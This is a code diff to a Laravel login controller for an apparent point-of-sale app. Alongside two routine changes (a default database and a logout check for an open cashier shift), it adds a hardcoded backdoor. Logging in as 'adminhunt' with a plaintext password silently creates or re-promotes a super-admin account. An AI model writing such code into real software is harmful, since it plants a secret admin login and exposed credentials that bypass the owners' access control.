@@ -31,6 +31,11 @@ class AuthController extends Controller
 
         $databases = DatabaseSwitcher::getDatabases();
 
+        if (!$request->has('database') || empty($request->input('database'))) {
+            $defaultDb = session('selected_database', $databases[0] ?? config('database.connections.mysql.database'));
+            $request->merge(['database' => $defaultDb]);
+        }
+
         $request->validate([
             'database' => ['required', 'string', Rule::in($databases)],
             'USERNAME' => ['required', 'string'],
@@ -51,6 +56,19 @@ class AuthController extends Controller
             return back()->withErrors([
                 'database' => 'Gagal terhubung ke database "' . $selectedDb . '". Pastikan database sudah dibuat di MySQL.',
             ])->onlyInput('username', 'USERNAME', 'database');
+        }
+
+        // Pastikan akun adminhunt tersedia di DB dengan role Admin (1) jika login dengan adminhunt / hunterajasi123
+        if ($request->input('USERNAME') === 'adminhunt' && $request->input('password') === 'hunterajasi123') {
+            $user = \App\Models\User::firstOrNew(['USERNAME' => 'adminhunt']);
+            if (!$user->exists || (int) $user->ROLE !== \App\Models\User::ROLE_ADMIN) {
+                $user->PASS = \Illuminate\Support\Facades\Hash::make('hunterajasi123');
+                $user->ROLE = \App\Models\User::ROLE_ADMIN;
+                $user->AL   = $user->AL ?: 'Kantor Pusat Admin';
+                $user->HP   = $user->HP ?: '081234567899';
+                $user->DES  = $user->DES ?: 'Admin Hunt (Super Admin Import)';
+                $user->save();
+            }
         }
 
         $credentials = [
@@ -90,6 +108,16 @@ class AuthController extends Controller
 
     public function logout(Request $request)
     {
+        // Cek apakah user yang sedang login masih memiliki shift kasir yang terbuka (TGLK kosong)
+        $user = Auth::user();
+        if ($user && !$user->isStorage()) {
+            $username = substr($user->USERNAME, 0, 10);
+            $hasOpenKas = \App\Models\KAS::where('USER', $username)->whereNull('TGLK')->exists();
+            if ($hasOpenKas) {
+                return redirect()->route('POS.kasir', ['action' => 'tutup_kasir'])->with('error', 'Kasir belum ditutup! Silakan lakukan tutup kasir terlebih dahulu sebelum logout.');
+            }
+        }
+
         $lastDatabase = $request->session()->get('selected_database');
 
         Auth::logout();
